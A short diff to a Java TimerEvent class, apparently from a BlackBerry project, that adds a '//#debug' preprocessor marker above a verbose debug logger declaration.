@@ -20,6 +20,7 @@ import com.ht.rcs.blackberry.utils.DebugLevel;
 public class TimerEvent extends Event {
     private static final int SLEEP_TIME = 1000;
 
+	//#debug
     private static Debug debug = new Debug("TimerEvent", DebugLevel.VERBOSE);
 
     int type;
